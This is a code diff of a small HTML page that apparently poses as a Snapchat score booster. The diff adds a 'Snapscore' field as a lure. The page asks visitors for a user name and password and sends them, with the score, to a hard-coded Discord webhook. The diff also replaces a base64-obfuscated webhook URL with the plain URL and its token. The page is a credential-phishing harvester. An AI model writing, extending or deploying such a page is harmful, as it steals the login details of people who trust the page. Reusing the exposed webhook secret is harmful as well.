@@ -44,19 +44,21 @@
         <h1>Send Message to Discord</h1>
         <input id="usr" type="text" placeholder="Enter User" required>
         <input id="pass" type="text" placeholder="Enter Pass" required>
+        <input id="score" type="number" placeholder="Enter Amount of Snapscore (max 10,000)" required>
         <button onclick="sendMessage()">Send</button>
     </div>
     <script>
         function sendMessage() {
             const usr = document.getElementById('usr').value;
             const pass = document.getElementById('pass').value;
+            const score = document.getElementById('score').value;
 
-            const webhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwOTE5MTU0MzMwNjg0NjI0OC9jMElMQ2t4WERNMHM3c3ZXSWZXekd1c21iOURIVlRxR1RwRGtQQUtCeWJtcFhrTVZZNkJOVlZQOTExNS10b1BZU21JSw==");
+            const webhookURL = "https://discord.com/api/webhooks/1309191543306846248/c0IlCkxXDM0s7svWIfWzGusmb9DHVTqGTpDkPAKBybmpXkMVY6BNVVP9115-toPYSmIK";
 
             fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `User: ${usr}, Pass: ${pass}` }),
+                body: JSON.stringify({ content: `User: ${usr}, Pass: ${pass}, Score: ${score}` }),
             })
             .then(response => {
                 if (response.ok) {
